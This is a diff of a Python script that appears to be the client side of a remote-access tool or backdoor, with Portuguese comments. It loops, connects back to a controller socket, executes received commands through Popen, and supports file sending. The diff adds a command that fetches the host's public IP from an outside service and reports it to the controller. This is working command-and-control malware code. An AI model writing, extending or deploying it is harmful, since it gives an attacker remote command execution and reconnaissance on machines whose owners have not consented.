@@ -2,7 +2,17 @@ from socket import *
 from time import sleep
 from subprocess import Popen, PIPE
 from os.path import getsize, exists
+from urllib.request import urlopen
 import platform
+
+
+
+CONFIG = {
+    "ANDRESS"    : ('localhost', 1000),
+    "API_GET_IP" : 'https://api.ipify.org/'
+}
+
+ANDRESS = ('localhost', 1000)
 
 def ManagerCommands(command):
     '''Executa o comando e retorna o resultado.'''
@@ -22,13 +32,11 @@ def AdaptedFromSystem(Windows='', Linux='', Other=''):
     elif(platforma == 'Linux'): return ManagerCommands(Linux)
     else: return ManagerCommands(Other)
 
-
-ANDRESS = ('localhost', 1000)
 while True:
     server = socket(AF_INET, SOCK_STREAM)
     try:
         ## Tenta se conectar ao servidor
-        server.connect(ANDRESS)
+        server.connect(CONFIG['ANDRESS'])
         try:
             while True:
                 ## Recebe o comando e transforma em um dicionario.
@@ -57,6 +65,15 @@ while True:
                     else:
                         server.send(b'S') ## Sucesso
 
+
+                elif(data['command'] == 'nxt_infoip'):
+                    try:
+                        IP = urlopen(CONFIG['API_GET_IP']).read()
+                        server.send(IP)
+                    except Exception as ex:
+                        print(f'{ex}')
+                        server.send(f'E: {ex}'.encode())
+                    continue
 
                 elif(data['command'] == 'nxt_sendfile'):
                     try:
